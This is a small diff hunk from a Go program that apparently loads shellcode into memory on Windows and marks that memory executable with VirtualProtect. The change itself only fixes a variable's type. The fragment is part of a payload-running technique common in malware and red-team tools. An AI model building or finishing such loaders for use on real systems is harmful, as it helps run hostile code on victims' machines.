@@ -51,7 +51,7 @@ func main() {
 	copy((*[990000]byte)(unsafe.Pointer(executableMemory))[:], shellcode)
 
 	// Change memory permissions to RX (read-execute)
-	oldProtect := windows.PAGE_READWRITE
+	var oldProtect uint32 = windows.PAGE_READWRITE
 	err = windows.VirtualProtect(executableMemory, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, &oldProtect)
 	if err != nil {
 		log.Fatal("Failed to change memory protection to RX: ", err)
